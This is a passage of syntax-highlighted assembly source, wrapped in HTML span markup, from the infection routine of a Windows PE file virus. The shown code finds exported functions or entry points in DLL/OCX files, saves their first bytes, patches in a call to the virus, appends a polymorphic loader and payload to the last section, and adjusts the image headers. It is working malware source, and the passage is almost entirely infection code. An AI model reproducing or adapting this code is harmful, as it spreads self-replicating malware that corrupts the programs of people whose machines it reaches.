   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT</span><span class="sc4">|</span><span class="sc5">MD</span><span class="sc4">|</span><span class="sc2">0</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_export_dir_rva</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_export_dir_va</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_EXPORT_DIRECTORY.NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  get first one</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc1">;  name of function in EAX</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_export_names</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

   </span><span class="sc1">;  Is this a valid function ?</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  load this file/library...</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_export_names</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_lib_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageRvaToSection</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_sz</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_replaced_api_section</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_check_know_section</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc1">;  VA to function in EAX</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_lib_rva</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">IsBadReadPtr</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_infect_end_3</span><span class="sc0">

   </span><span class="sc1">;  EAX points to the code of the first</span><span class="sc0">
   </span><span class="sc1">;  exported function</span><span class="sc0">

   </span><span class="sc1">;  now we need to know if</span><span class="sc0">
   </span><span class="sc1">;  we have write access</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_close_file</span><span class="sc0">

   </span><span class="sc1">;  unload it from memory</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_file_infect</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_current_fname</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_open_write</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  we've it...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0"> </span><span class="sc1">;  &lt;---temporary - it'l be the poly loader size</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_viral_pack_packet_sz</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_lib_rva</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_virtual_raw</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_pack_packet_sz</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_size</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ImageNtHeader</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_loader_memory_protect?_dif</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">;  saving virus VA</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_lib_rva</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_infect_orig_bytes</span><span class="sc0">  </span><span class="sc1">;  **************************************************************************</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">;  original bytes'r safe, installing "CALL VIRUS"</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_flechal_rva</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">   

   </span><span class="sc1">;  ok, we need to add a loader to this file</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_last_section</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hWnd_MapViewOfFile</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_align</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_section_size</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.FileAlignment</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_re_align</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hWnd_MapViewOfFile</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc1">;  &lt;---temporary - start of poly code</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">l_size</span><span class="sc0">   </span><span class="sc1">;  &lt;---temporary - poly code </span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_viral_temp_buffer_1</span><span class="sc0">   </span><span class="sc1">;  &lt;---temporary - _viral_pack_packet_addr</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_viral_temp_sz</span><span class="sc0"> </span><span class="sc1">; &lt;--temporary _viral_pack_packet_sz</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc1">;  updating section / Image Size</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DONE</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc5">_valid_entry_point</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  export directory found</span><span class="sc0">
   </span><span class="sc1">;  sfc protection not found</span><span class="sc0">
   </span><span class="sc1">;  entry point found (maybe .DLL/.OCX file)</span><span class="sc0">

   </span><span class="sc1">;  we've to try to infect this file replacing 5 first bytes at the entry-point (we cannot damage an exported</span><span class="sc0">
   </span><span class="sc1">;  function compressing it)</span><span class="sc0">

   </span><span class="sc1">;  infection flag - 1</span><span class="sc0">

   </span><span class="sc6">nop</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_mode_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INFECT</span><span class="sc4">|</span><span class="sc5">MD</span><span class="sc4">|</span><span class="sc2">1</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MessageBoxA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_infect_entry_point</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_infect_EP_section</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_replaced_api_section_sz</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">_replaced_api_section</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_infect_orig_bytes</span><span class="sc0">  </span><span class="sc1">;  **************************************************************************</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_check_know_section</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">

   </span><span class="sc1">;  ok, let's ...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_infect_end_2</span><span class="sc0">
